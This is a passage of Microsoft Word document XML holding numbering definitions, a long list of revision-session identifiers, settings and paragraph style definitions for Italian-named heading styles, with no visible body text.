  </w:num>
  <w:num w:numId="17" w16cid:durableId="303582772">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="18" w16cid:durableId="2074503990">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="19" w16cid:durableId="2128504865">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="20" w16cid:durableId="17870438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trackRevisions w:val="false"/>
  <w:defaultTabStop w:val="720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YyMjA2MDYxMzE0MjVV0lEKTi0uzszPAykwrAUAuIsJbSwAAAA="/>
  </w:docVars>
  <w:rsids>
    <w:rsidRoot w:val="00121413"/>
    <w:rsid w:val="000336E2"/>
    <w:rsid w:val="000748AA"/>
    <w:rsid w:val="000C6762"/>
    <w:rsid w:val="00121413"/>
    <w:rsid w:val="00127A8F"/>
    <w:rsid w:val="0013CE9C"/>
    <w:rsid w:val="001638F6"/>
    <w:rsid w:val="00172FAB"/>
    <w:rsid w:val="001A2000"/>
    <w:rsid w:val="00252088"/>
    <w:rsid w:val="00301D40"/>
    <w:rsid w:val="003209D6"/>
    <w:rsid w:val="00334A73"/>
    <w:rsid w:val="003422FF"/>
    <w:rsid w:val="00345496"/>
    <w:rsid w:val="003B0298"/>
    <w:rsid w:val="004952C4"/>
    <w:rsid w:val="004A3D0B"/>
    <w:rsid w:val="00516F0F"/>
    <w:rsid w:val="00552F2B"/>
    <w:rsid w:val="005576BE"/>
    <w:rsid w:val="00596F19"/>
    <w:rsid w:val="005A1C5A"/>
    <w:rsid w:val="005D6A9F"/>
    <w:rsid w:val="00680E7B"/>
    <w:rsid w:val="00690EFD"/>
    <w:rsid w:val="007021DE"/>
    <w:rsid w:val="00732607"/>
    <w:rsid w:val="00762ED1"/>
    <w:rsid w:val="00844483"/>
    <w:rsid w:val="00844FFE"/>
    <w:rsid w:val="0090542F"/>
    <w:rsid w:val="00934F1C"/>
    <w:rsid w:val="009D2231"/>
    <w:rsid w:val="00A122DB"/>
    <w:rsid w:val="00A41C19"/>
    <w:rsid w:val="00AD165F"/>
    <w:rsid w:val="00AF78EB"/>
    <w:rsid w:val="00B47B7A"/>
    <w:rsid w:val="00B646B8"/>
    <w:rsid w:val="00C64B20"/>
    <w:rsid w:val="00C80BD4"/>
    <w:rsid w:val="00C828B3"/>
    <w:rsid w:val="00CA3275"/>
    <w:rsid w:val="00CC239F"/>
    <w:rsid w:val="00CE488A"/>
    <w:rsid w:val="00CF3A42"/>
    <w:rsid w:val="00D5413C"/>
    <w:rsid w:val="00D922B7"/>
    <w:rsid w:val="00DC07A3"/>
    <w:rsid w:val="00E11B8A"/>
    <w:rsid w:val="00F677F9"/>
    <w:rsid w:val="00FC391B"/>
    <w:rsid w:val="00FD1504"/>
    <w:rsid w:val="0136AAB3"/>
    <w:rsid w:val="013A8C00"/>
    <w:rsid w:val="0183AF5C"/>
    <w:rsid w:val="01D43476"/>
    <w:rsid w:val="02668867"/>
    <w:rsid w:val="03243EE8"/>
    <w:rsid w:val="03C87258"/>
    <w:rsid w:val="048EF4D7"/>
    <w:rsid w:val="04B462C7"/>
    <w:rsid w:val="054BD4C6"/>
    <w:rsid w:val="061C2049"/>
    <w:rsid w:val="0689D758"/>
    <w:rsid w:val="06B66413"/>
    <w:rsid w:val="0715FB61"/>
    <w:rsid w:val="084A9F95"/>
    <w:rsid w:val="084E5E93"/>
    <w:rsid w:val="085FB132"/>
    <w:rsid w:val="087DB41D"/>
    <w:rsid w:val="08F74FA9"/>
    <w:rsid w:val="09008E1D"/>
    <w:rsid w:val="093E3C0E"/>
    <w:rsid w:val="09B87D4A"/>
    <w:rsid w:val="0A2B0F97"/>
    <w:rsid w:val="0A3350B1"/>
    <w:rsid w:val="0B17E277"/>
    <w:rsid w:val="0B7BBD05"/>
    <w:rsid w:val="0BA7A04C"/>
    <w:rsid w:val="0C0A8751"/>
    <w:rsid w:val="0C3AFF57"/>
    <w:rsid w:val="0C49B4CA"/>
    <w:rsid w:val="0D011F4F"/>
    <w:rsid w:val="0D7C3769"/>
    <w:rsid w:val="0DA6DFD3"/>
    <w:rsid w:val="0E3E5964"/>
    <w:rsid w:val="0E478A3E"/>
    <w:rsid w:val="0E7E00CA"/>
    <w:rsid w:val="0F2C45B2"/>
    <w:rsid w:val="10409226"/>
    <w:rsid w:val="1052D9BD"/>
    <w:rsid w:val="1076F917"/>
    <w:rsid w:val="113ACB79"/>
    <w:rsid w:val="1156300C"/>
    <w:rsid w:val="11620C28"/>
    <w:rsid w:val="11EBCC5C"/>
    <w:rsid w:val="121051FE"/>
    <w:rsid w:val="12789C9E"/>
    <w:rsid w:val="12A44C98"/>
    <w:rsid w:val="12C75BA3"/>
    <w:rsid w:val="13111650"/>
    <w:rsid w:val="133983A1"/>
    <w:rsid w:val="14435809"/>
    <w:rsid w:val="155449CE"/>
    <w:rsid w:val="1555CECF"/>
    <w:rsid w:val="155847B1"/>
    <w:rsid w:val="155AEE40"/>
    <w:rsid w:val="157B0394"/>
    <w:rsid w:val="158188DD"/>
    <w:rsid w:val="1585D635"/>
    <w:rsid w:val="158C9B05"/>
    <w:rsid w:val="15AA5631"/>
    <w:rsid w:val="15BC5F52"/>
    <w:rsid w:val="1607CA05"/>
    <w:rsid w:val="1651D37F"/>
    <w:rsid w:val="174EDC94"/>
    <w:rsid w:val="177D4CAC"/>
    <w:rsid w:val="17A8B9EB"/>
    <w:rsid w:val="17B81A7F"/>
    <w:rsid w:val="189D714C"/>
    <w:rsid w:val="18A52273"/>
    <w:rsid w:val="192A7536"/>
    <w:rsid w:val="19766A24"/>
    <w:rsid w:val="19837ECE"/>
    <w:rsid w:val="198974E8"/>
    <w:rsid w:val="19DAB446"/>
    <w:rsid w:val="1A0586A7"/>
    <w:rsid w:val="1A64CD88"/>
    <w:rsid w:val="1A9FE974"/>
    <w:rsid w:val="1AF6700A"/>
    <w:rsid w:val="1B6DEBD2"/>
    <w:rsid w:val="1BC4B09E"/>
    <w:rsid w:val="1C3573CC"/>
    <w:rsid w:val="1C459188"/>
    <w:rsid w:val="1C776CDE"/>
    <w:rsid w:val="1CAD56AE"/>
    <w:rsid w:val="1CBEC19C"/>
    <w:rsid w:val="1CC3C9A9"/>
    <w:rsid w:val="1CF33C92"/>
    <w:rsid w:val="1D41CCD5"/>
    <w:rsid w:val="1DCC85AC"/>
    <w:rsid w:val="1E031E60"/>
    <w:rsid w:val="1E9E4F8C"/>
    <w:rsid w:val="1ECF87C1"/>
    <w:rsid w:val="1EED3087"/>
    <w:rsid w:val="1F1B2933"/>
    <w:rsid w:val="1F895182"/>
    <w:rsid w:val="1F96FAC9"/>
    <w:rsid w:val="1FF0E94D"/>
    <w:rsid w:val="1FFA55BE"/>
    <w:rsid w:val="207A4E5D"/>
    <w:rsid w:val="209AF524"/>
    <w:rsid w:val="20D36C9B"/>
    <w:rsid w:val="20D47329"/>
    <w:rsid w:val="20F8FBE2"/>
    <w:rsid w:val="20FE4E90"/>
    <w:rsid w:val="21040C4D"/>
    <w:rsid w:val="21991BBD"/>
    <w:rsid w:val="21BD37E7"/>
    <w:rsid w:val="21CAF13F"/>
    <w:rsid w:val="2224A4C8"/>
    <w:rsid w:val="2263631D"/>
    <w:rsid w:val="22BD725C"/>
    <w:rsid w:val="22C89325"/>
    <w:rsid w:val="22C89BA8"/>
    <w:rsid w:val="22ED620B"/>
    <w:rsid w:val="236EFC9C"/>
    <w:rsid w:val="23B65BB6"/>
    <w:rsid w:val="2404A676"/>
    <w:rsid w:val="2437694B"/>
    <w:rsid w:val="2493D69B"/>
    <w:rsid w:val="24D64BB1"/>
    <w:rsid w:val="25187C0A"/>
    <w:rsid w:val="2546DDD7"/>
    <w:rsid w:val="260CE19D"/>
    <w:rsid w:val="262438C5"/>
    <w:rsid w:val="26563716"/>
    <w:rsid w:val="265D7359"/>
    <w:rsid w:val="2667789F"/>
    <w:rsid w:val="26FE65F0"/>
    <w:rsid w:val="2782C90D"/>
    <w:rsid w:val="27A0EAE4"/>
    <w:rsid w:val="27A83205"/>
    <w:rsid w:val="27ACBE66"/>
    <w:rsid w:val="280583DA"/>
    <w:rsid w:val="284C5906"/>
    <w:rsid w:val="290C0352"/>
    <w:rsid w:val="2916A7FC"/>
    <w:rsid w:val="29893448"/>
    <w:rsid w:val="2998F63F"/>
    <w:rsid w:val="29AD13FC"/>
    <w:rsid w:val="29C1E361"/>
    <w:rsid w:val="29DC84D7"/>
    <w:rsid w:val="2AE6E3FE"/>
    <w:rsid w:val="2B5FA76F"/>
    <w:rsid w:val="2BBA1C1D"/>
    <w:rsid w:val="2C3A3CAA"/>
    <w:rsid w:val="2CAFF607"/>
    <w:rsid w:val="2CCBE12A"/>
    <w:rsid w:val="2CE188C1"/>
    <w:rsid w:val="2D05A9B6"/>
    <w:rsid w:val="2DEEBA6A"/>
    <w:rsid w:val="2E175743"/>
    <w:rsid w:val="2E49AB80"/>
    <w:rsid w:val="2E6F9B66"/>
    <w:rsid w:val="2E82C2C3"/>
    <w:rsid w:val="2ECD7516"/>
    <w:rsid w:val="2EFC74CD"/>
    <w:rsid w:val="2F05F013"/>
    <w:rsid w:val="2F47A459"/>
    <w:rsid w:val="2F88D009"/>
    <w:rsid w:val="2FA5F223"/>
    <w:rsid w:val="302FD65E"/>
    <w:rsid w:val="3064F66D"/>
    <w:rsid w:val="3086534F"/>
    <w:rsid w:val="30A5F2E3"/>
    <w:rsid w:val="30F79A37"/>
    <w:rsid w:val="31C1F148"/>
    <w:rsid w:val="31E5C106"/>
    <w:rsid w:val="320006D3"/>
    <w:rsid w:val="3216A332"/>
    <w:rsid w:val="32917259"/>
    <w:rsid w:val="33CDDB6B"/>
    <w:rsid w:val="34498E3F"/>
    <w:rsid w:val="345E4B20"/>
    <w:rsid w:val="3465245A"/>
    <w:rsid w:val="348D3A51"/>
    <w:rsid w:val="349B1F0A"/>
    <w:rsid w:val="34B13389"/>
    <w:rsid w:val="34EA4CA1"/>
    <w:rsid w:val="35166791"/>
    <w:rsid w:val="35191BDE"/>
    <w:rsid w:val="356030A3"/>
    <w:rsid w:val="358B7BE4"/>
    <w:rsid w:val="35A2B3FD"/>
    <w:rsid w:val="35BFEF97"/>
    <w:rsid w:val="35CB9BDE"/>
    <w:rsid w:val="3602438A"/>
    <w:rsid w:val="363E6361"/>
    <w:rsid w:val="3684FC79"/>
    <w:rsid w:val="36FC9BE0"/>
    <w:rsid w:val="375689C3"/>
    <w:rsid w:val="37786146"/>
    <w:rsid w:val="378D8643"/>
    <w:rsid w:val="382C496D"/>
    <w:rsid w:val="38369DD6"/>
    <w:rsid w:val="38A70761"/>
    <w:rsid w:val="38D13DDF"/>
    <w:rsid w:val="38D18A60"/>
    <w:rsid w:val="38FC1CD6"/>
    <w:rsid w:val="39307CCF"/>
    <w:rsid w:val="39A7BEB1"/>
    <w:rsid w:val="3A89C4FA"/>
    <w:rsid w:val="3AA1BB5E"/>
    <w:rsid w:val="3B45EA63"/>
    <w:rsid w:val="3B94F969"/>
    <w:rsid w:val="3C7E229C"/>
    <w:rsid w:val="3C86D574"/>
    <w:rsid w:val="3CA40B43"/>
    <w:rsid w:val="3CEBA1E4"/>
    <w:rsid w:val="3D1769BF"/>
    <w:rsid w:val="3D342567"/>
    <w:rsid w:val="3D70EF86"/>
    <w:rsid w:val="3D79AA5D"/>
    <w:rsid w:val="3D9D7F5F"/>
    <w:rsid w:val="3DE2A2F9"/>
    <w:rsid w:val="3DED81D9"/>
    <w:rsid w:val="3E90D32B"/>
    <w:rsid w:val="3F2C77CE"/>
    <w:rsid w:val="3F3C7230"/>
    <w:rsid w:val="3F769EF3"/>
    <w:rsid w:val="3F8D52E2"/>
    <w:rsid w:val="4098E9A5"/>
    <w:rsid w:val="40F05B5E"/>
    <w:rsid w:val="4150EAEE"/>
    <w:rsid w:val="416AD9B0"/>
    <w:rsid w:val="41B22050"/>
    <w:rsid w:val="42498AAF"/>
    <w:rsid w:val="424D5C94"/>
    <w:rsid w:val="42A13A76"/>
    <w:rsid w:val="42EBB7E3"/>
    <w:rsid w:val="43826D11"/>
    <w:rsid w:val="438E02C5"/>
    <w:rsid w:val="43CD5444"/>
    <w:rsid w:val="441631B0"/>
    <w:rsid w:val="44C87B59"/>
    <w:rsid w:val="44F49FE6"/>
    <w:rsid w:val="45046BEE"/>
    <w:rsid w:val="45206BC9"/>
    <w:rsid w:val="45C238E5"/>
    <w:rsid w:val="45C840CE"/>
    <w:rsid w:val="45D0E0A2"/>
    <w:rsid w:val="46287DC7"/>
    <w:rsid w:val="462C0BE2"/>
    <w:rsid w:val="46307978"/>
    <w:rsid w:val="463E7C52"/>
    <w:rsid w:val="46A04ED9"/>
    <w:rsid w:val="475E30DF"/>
    <w:rsid w:val="476CFB43"/>
    <w:rsid w:val="47C999CB"/>
    <w:rsid w:val="4801921D"/>
    <w:rsid w:val="481EEEE7"/>
    <w:rsid w:val="483353C7"/>
    <w:rsid w:val="484FB3C6"/>
    <w:rsid w:val="4931F375"/>
    <w:rsid w:val="499E1E03"/>
    <w:rsid w:val="49C69CD0"/>
    <w:rsid w:val="49DD2D23"/>
    <w:rsid w:val="4A98E468"/>
    <w:rsid w:val="4A9D34FF"/>
    <w:rsid w:val="4B2F4F99"/>
    <w:rsid w:val="4B4801F7"/>
    <w:rsid w:val="4B4D667A"/>
    <w:rsid w:val="4B84784D"/>
    <w:rsid w:val="4BA8202C"/>
    <w:rsid w:val="4BB971AE"/>
    <w:rsid w:val="4C28CD52"/>
    <w:rsid w:val="4C2A5BCA"/>
    <w:rsid w:val="4CBED57E"/>
    <w:rsid w:val="4D3F32D0"/>
    <w:rsid w:val="4D79841F"/>
    <w:rsid w:val="4DF51D6F"/>
    <w:rsid w:val="4E256000"/>
    <w:rsid w:val="4E377C05"/>
    <w:rsid w:val="4E45A765"/>
    <w:rsid w:val="4ECEB5F8"/>
    <w:rsid w:val="4EE91331"/>
    <w:rsid w:val="4F0B7F0C"/>
    <w:rsid w:val="4F1168DE"/>
    <w:rsid w:val="4FA42CB8"/>
    <w:rsid w:val="4FAE0E59"/>
    <w:rsid w:val="500CFE57"/>
    <w:rsid w:val="50305274"/>
    <w:rsid w:val="504C2A4B"/>
    <w:rsid w:val="505EE195"/>
    <w:rsid w:val="508A6EF6"/>
    <w:rsid w:val="50B1E9F0"/>
    <w:rsid w:val="50D0E0F7"/>
    <w:rsid w:val="50E4A490"/>
    <w:rsid w:val="513C7129"/>
    <w:rsid w:val="5185FEFB"/>
    <w:rsid w:val="523AC705"/>
    <w:rsid w:val="52AA52EB"/>
    <w:rsid w:val="52D2DE76"/>
    <w:rsid w:val="536E8E2C"/>
    <w:rsid w:val="54049A09"/>
    <w:rsid w:val="542B7708"/>
    <w:rsid w:val="54506AA5"/>
    <w:rsid w:val="546AE61F"/>
    <w:rsid w:val="54D64F7E"/>
    <w:rsid w:val="54E67CBA"/>
    <w:rsid w:val="552930A2"/>
    <w:rsid w:val="55647F92"/>
    <w:rsid w:val="55B815B3"/>
    <w:rsid w:val="55D7858C"/>
    <w:rsid w:val="561795C5"/>
    <w:rsid w:val="564B7736"/>
    <w:rsid w:val="566D8371"/>
    <w:rsid w:val="568290FB"/>
    <w:rsid w:val="56C8D019"/>
    <w:rsid w:val="56E8BE89"/>
    <w:rsid w:val="570B1F84"/>
    <w:rsid w:val="5712D5E5"/>
    <w:rsid w:val="571C6424"/>
    <w:rsid w:val="575FC9EB"/>
    <w:rsid w:val="57FEDFDA"/>
    <w:rsid w:val="58119C29"/>
    <w:rsid w:val="5811B926"/>
    <w:rsid w:val="582F9A30"/>
    <w:rsid w:val="58373801"/>
    <w:rsid w:val="5860C5A0"/>
    <w:rsid w:val="58E30C23"/>
    <w:rsid w:val="5926A45A"/>
    <w:rsid w:val="59CBF65B"/>
    <w:rsid w:val="59CC5DD0"/>
    <w:rsid w:val="5A1A8B37"/>
    <w:rsid w:val="5A99956F"/>
    <w:rsid w:val="5AC5044E"/>
    <w:rsid w:val="5AE41996"/>
    <w:rsid w:val="5AE8B2E6"/>
    <w:rsid w:val="5BA6DBB1"/>
    <w:rsid w:val="5BAB1AE3"/>
    <w:rsid w:val="5BC60170"/>
    <w:rsid w:val="5C01D676"/>
    <w:rsid w:val="5C08AAC7"/>
    <w:rsid w:val="5CAF2A8A"/>
    <w:rsid w:val="5CD4A039"/>
    <w:rsid w:val="5DC32DA5"/>
    <w:rsid w:val="5E02E1A8"/>
    <w:rsid w:val="5E63D825"/>
    <w:rsid w:val="5EF1B9CF"/>
    <w:rsid w:val="5F1972D2"/>
    <w:rsid w:val="5F2698FD"/>
    <w:rsid w:val="5F81DAF1"/>
    <w:rsid w:val="5FF540DB"/>
    <w:rsid w:val="602894BF"/>
    <w:rsid w:val="603694FF"/>
    <w:rsid w:val="603F5BE0"/>
    <w:rsid w:val="6046AB14"/>
    <w:rsid w:val="60D3C387"/>
    <w:rsid w:val="60DBF3F2"/>
    <w:rsid w:val="6110D22A"/>
    <w:rsid w:val="611D65F4"/>
    <w:rsid w:val="620FBF00"/>
    <w:rsid w:val="6286841C"/>
    <w:rsid w:val="628FE5B8"/>
    <w:rsid w:val="62C38CB8"/>
    <w:rsid w:val="62D1C5D2"/>
    <w:rsid w:val="62F09BCA"/>
    <w:rsid w:val="630C6255"/>
    <w:rsid w:val="6319414A"/>
    <w:rsid w:val="633BA734"/>
    <w:rsid w:val="63588E22"/>
    <w:rsid w:val="635B49D8"/>
    <w:rsid w:val="638D34AA"/>
    <w:rsid w:val="63F6D2A8"/>
    <w:rsid w:val="63F7DB99"/>
    <w:rsid w:val="6417143B"/>
    <w:rsid w:val="642339D2"/>
    <w:rsid w:val="64D2293E"/>
    <w:rsid w:val="651EDB41"/>
    <w:rsid w:val="652969FF"/>
    <w:rsid w:val="652C210D"/>
    <w:rsid w:val="6595267E"/>
    <w:rsid w:val="65CD6E90"/>
    <w:rsid w:val="65E07A57"/>
    <w:rsid w:val="65E84CB6"/>
    <w:rsid w:val="668E0DE3"/>
    <w:rsid w:val="66E25AE2"/>
    <w:rsid w:val="66F4BDE0"/>
    <w:rsid w:val="675B1500"/>
    <w:rsid w:val="67D082DF"/>
    <w:rsid w:val="67DABC4E"/>
    <w:rsid w:val="68182974"/>
    <w:rsid w:val="681E74BA"/>
    <w:rsid w:val="686ECC49"/>
    <w:rsid w:val="687E2107"/>
    <w:rsid w:val="691A20AC"/>
    <w:rsid w:val="69BCCF3B"/>
    <w:rsid w:val="69F12E11"/>
    <w:rsid w:val="69FFB61D"/>
    <w:rsid w:val="6A6C3AB2"/>
    <w:rsid w:val="6AD30F78"/>
    <w:rsid w:val="6ADD6C3E"/>
    <w:rsid w:val="6C0041AF"/>
    <w:rsid w:val="6C0ADF91"/>
    <w:rsid w:val="6C1C26C7"/>
    <w:rsid w:val="6CEDDA9C"/>
    <w:rsid w:val="6D2E8448"/>
    <w:rsid w:val="6D54782F"/>
    <w:rsid w:val="6D85503E"/>
    <w:rsid w:val="6D9D7A11"/>
    <w:rsid w:val="6E42A19B"/>
    <w:rsid w:val="6E771FDD"/>
    <w:rsid w:val="6F12B433"/>
    <w:rsid w:val="6F21209F"/>
    <w:rsid w:val="6F56BC47"/>
    <w:rsid w:val="6F6093FC"/>
    <w:rsid w:val="6FBD4444"/>
    <w:rsid w:val="6FC7BE8D"/>
    <w:rsid w:val="7048216B"/>
    <w:rsid w:val="707FCA0C"/>
    <w:rsid w:val="7097324E"/>
    <w:rsid w:val="718FF1AC"/>
    <w:rsid w:val="719D5A11"/>
    <w:rsid w:val="71C97B2D"/>
    <w:rsid w:val="727E78CD"/>
    <w:rsid w:val="728BBA8D"/>
    <w:rsid w:val="72DFB9C3"/>
    <w:rsid w:val="739115A1"/>
    <w:rsid w:val="740A2D5E"/>
    <w:rsid w:val="74102E90"/>
    <w:rsid w:val="7417998E"/>
    <w:rsid w:val="743F59ED"/>
    <w:rsid w:val="74B3331E"/>
    <w:rsid w:val="750B66D5"/>
    <w:rsid w:val="75392597"/>
    <w:rsid w:val="76317274"/>
    <w:rsid w:val="766ADD16"/>
    <w:rsid w:val="76755DCF"/>
    <w:rsid w:val="76CC6C5F"/>
    <w:rsid w:val="76DD0049"/>
    <w:rsid w:val="7705EE25"/>
    <w:rsid w:val="770F4599"/>
    <w:rsid w:val="771BC0FB"/>
    <w:rsid w:val="77480629"/>
    <w:rsid w:val="77C215B9"/>
    <w:rsid w:val="783A262E"/>
    <w:rsid w:val="786EA448"/>
    <w:rsid w:val="78E16DA7"/>
    <w:rsid w:val="79643529"/>
    <w:rsid w:val="7966E34E"/>
    <w:rsid w:val="79728DE5"/>
    <w:rsid w:val="798B252C"/>
    <w:rsid w:val="79FC1921"/>
    <w:rsid w:val="7A3AB608"/>
    <w:rsid w:val="7A46BC0C"/>
    <w:rsid w:val="7AF82C71"/>
    <w:rsid w:val="7B2B69F7"/>
    <w:rsid w:val="7B46CA8A"/>
    <w:rsid w:val="7B53694E"/>
    <w:rsid w:val="7B79342D"/>
    <w:rsid w:val="7BB1166B"/>
    <w:rsid w:val="7C5E80AE"/>
    <w:rsid w:val="7C910955"/>
    <w:rsid w:val="7C9BBB11"/>
    <w:rsid w:val="7CF79D31"/>
    <w:rsid w:val="7CFF67B1"/>
    <w:rsid w:val="7D23C4E3"/>
    <w:rsid w:val="7D76577E"/>
    <w:rsid w:val="7DA25420"/>
    <w:rsid w:val="7DDF2683"/>
    <w:rsid w:val="7DF9D57C"/>
    <w:rsid w:val="7E3710CD"/>
    <w:rsid w:val="7E43A7B3"/>
    <w:rsid w:val="7E622A39"/>
    <w:rsid w:val="7EBB0B66"/>
    <w:rsid w:val="7EBD0F62"/>
    <w:rsid w:val="7F4633D8"/>
    <w:rsid w:val="7F470528"/>
    <w:rsid w:val="7F50E8CC"/>
    <w:rsid w:val="7F8F231A"/>
    <w:rsid w:val="7F9FB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5245B3B1"/>
  <w15:chartTrackingRefBased/>
  <w15:docId w15:val="{187EFC76-514E-475E-B967-FEFCBE5584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EastAsia" w:cstheme="minorBidi"/>
        <w:color w:val="4D322D" w:themeColor="text2"/>
        <w:sz w:val="22"/>
        <w:szCs w:val="22"/>
        <w:lang w:val="it-IT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4" w:semiHidden="1" w:unhideWhenUsed="1" w:qFormat="1"/>
    <w:lsdException w:name="heading 5" w:uiPriority="13" w:semiHidden="1" w:unhideWhenUsed="1" w:qFormat="1"/>
    <w:lsdException w:name="heading 6" w:uiPriority="13" w:semiHidden="1" w:unhideWhenUsed="1" w:qFormat="1"/>
    <w:lsdException w:name="heading 7" w:uiPriority="4" w:semiHidden="1" w:unhideWhenUsed="1" w:qFormat="1"/>
    <w:lsdException w:name="heading 8" w:uiPriority="4" w:semiHidden="1" w:unhideWhenUsed="1" w:qFormat="1"/>
    <w:lsdException w:name="heading 9" w:uiPriority="4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2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7" w:semiHidden="1" w:unhideWhenUsed="1" w:qFormat="1"/>
    <w:lsdException w:name="List Number" w:uiPriority="1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semiHidden="1" w:qFormat="1"/>
    <w:lsdException w:name="Emphasis" w:uiPriority="10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qFormat="1"/>
    <w:lsdException w:name="Quote" w:uiPriority="1" w:semiHidden="1" w:unhideWhenUsed="1"/>
    <w:lsdException w:name="Intense Quote" w:uiPriority="30" w:semiHidden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qFormat="1"/>
    <w:lsdException w:name="Intense Emphasis" w:uiPriority="21" w:semiHidden="1" w:qFormat="1"/>
    <w:lsdException w:name="Subtle Reference" w:uiPriority="31" w:semiHidden="1" w:qFormat="1"/>
    <w:lsdException w:name="Intense Reference" w:uiPriority="32" w:semiHidden="1" w:qFormat="1"/>
    <w:lsdException w:name="Book Title" w:uiPriority="33" w:semiHidden="1" w:qFormat="1"/>
    <w:lsdException w:name="Bibliography" w:uiPriority="39" w:semiHidden="1" w:unhideWhenUsed="1"/>
    <w:lsdException w:name="TOC Heading" w:uiPriority="39" w:semiHidden="1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e" w:default="1">
    <w:uiPriority w:val="0"/>
    <w:name w:val="Normal"/>
    <w:qFormat/>
    <w:rsid w:val="21040C4D"/>
    <w:rPr>
      <w:noProof w:val="0"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Titolo1">
    <w:uiPriority w:val="4"/>
    <w:name w:val="heading 1"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:link w:val="Titolo1Carattere"/>
    <w:qFormat/>
    <w:rsid w:val="21040C4D"/>
    <w:rPr>
      <w:rFonts w:ascii="Constantia" w:hAnsi="Constantia" w:eastAsia="" w:cs="" w:asciiTheme="majorAscii" w:hAnsiTheme="majorAscii" w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:color w:val="3F251D" w:themeColor="accent1" w:themeTint="FF" w:themeShade="FF"/>
      <w:sz w:val="30"/>
      <w:szCs w:val="30"/>
    </w:rPr>
    <w:pPr>
      <w:keepNext w:val="1"/>
      <w:keepLines w:val="1"/>
      <w:spacing w:before="600" w:after="60"/>
      <w:outlineLvl w:val="0"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Titolo2">
    <w:uiPriority w:val="4"/>
    <w:name w:val="heading 2"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:unhideWhenUsed/>
    <w:link w:val="Titolo2Carattere"/>
    <w:qFormat/>
    <w:rsid w:val="21040C4D"/>
    <w:rPr>
      <w:rFonts w:ascii="Constantia" w:hAnsi="Constantia" w:eastAsia="" w:cs="" w:asciiTheme="majorAscii" w:hAnsiTheme="majorAscii" w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:caps w:val="1"/>
      <w:color w:val="3F251D" w:themeColor="accent1" w:themeTint="FF" w:themeShade="FF"/>
    </w:rPr>
    <w:pPr>
      <w:keepNext w:val="1"/>
      <w:keepLines w:val="1"/>
      <w:spacing w:before="240" w:after="0"/>
      <w:outlineLvl w:val="1"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Titolo3">
    <w:uiPriority w:val="4"/>
    <w:name w:val="heading 3"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:link w:val="Titolo3Carattere"/>
    <w:qFormat/>
    <w:rsid w:val="21040C4D"/>
    <w:rPr>
      <w:rFonts w:ascii="Constantia" w:hAnsi="Constantia" w:eastAsia="" w:cs="" w:asciiTheme="majorAscii" w:hAnsiTheme="majorAscii" w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:color w:val="3F251D" w:themeColor="accent1" w:themeTint="FF" w:themeShade="FF"/>
    </w:rPr>
    <w:pPr>
      <w:keepNext w:val="1"/>
      <w:keepLines w:val="1"/>
      <w:spacing w:before="200" w:after="0"/>
      <w:outlineLvl w:val="2"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Titolo5">
    <w:uiPriority w:val="4"/>
    <w:name w:val="heading 5"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:link w:val="Titolo5Carattere"/>
    <w:qFormat/>
    <w:rsid w:val="21040C4D"/>
    <w:rPr>
      <w:rFonts w:ascii="Constantia" w:hAnsi="Constantia" w:eastAsia="" w:cs="" w:asciiTheme="majorAscii" w:hAnsiTheme="majorAscii" w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:color w:val="1F120E"/>
    </w:rPr>
    <w:pPr>
      <w:keepNext w:val="1"/>
      <w:keepLines w:val="1"/>
      <w:spacing w:before="200" w:after="0"/>
      <w:outlineLvl w:val="4"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Titolo6">
    <w:uiPriority w:val="4"/>
    <w:name w:val="heading 6"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:link w:val="Titolo6Carattere"/>
    <w:qFormat/>
    <w:rsid w:val="21040C4D"/>
    <w:rPr>
      <w:rFonts w:ascii="Constantia" w:hAnsi="Constantia" w:eastAsia="" w:cs="" w:asciiTheme="majorAscii" w:hAnsiTheme="majorAscii" w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:i w:val="1"/>
      <w:iCs w:val="1"/>
      <w:color w:val="1F120E"/>
    </w:rPr>
    <w:pPr>
      <w:keepNext w:val="1"/>
      <w:keepLines w:val="1"/>
      <w:spacing w:before="200" w:after="0"/>
      <w:outlineLvl w:val="5"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Titolo8">
    <w:uiPriority w:val="4"/>
    <w:name w:val="heading 8"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:link w:val="Titolo8Carattere"/>
    <w:qFormat/>
    <w:rsid w:val="21040C4D"/>
    <w:rPr>
      <w:rFonts w:ascii="Constantia" w:hAnsi="Constantia" w:eastAsia="" w:cs="" w:asciiTheme="majorAscii" w:hAnsiTheme="majorAscii" w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:color w:val="272727"/>
    </w:rPr>
    <w:pPr>
      <w:keepNext w:val="1"/>
      <w:keepLines w:val="1"/>
      <w:spacing w:before="40" w:after="0"/>
      <w:outlineLvl w:val="7"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Titolo9">
    <w:uiPriority w:val="4"/>
    <w:name w:val="heading 9"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:link w:val="Titolo9Carattere"/>
    <w:qFormat/>
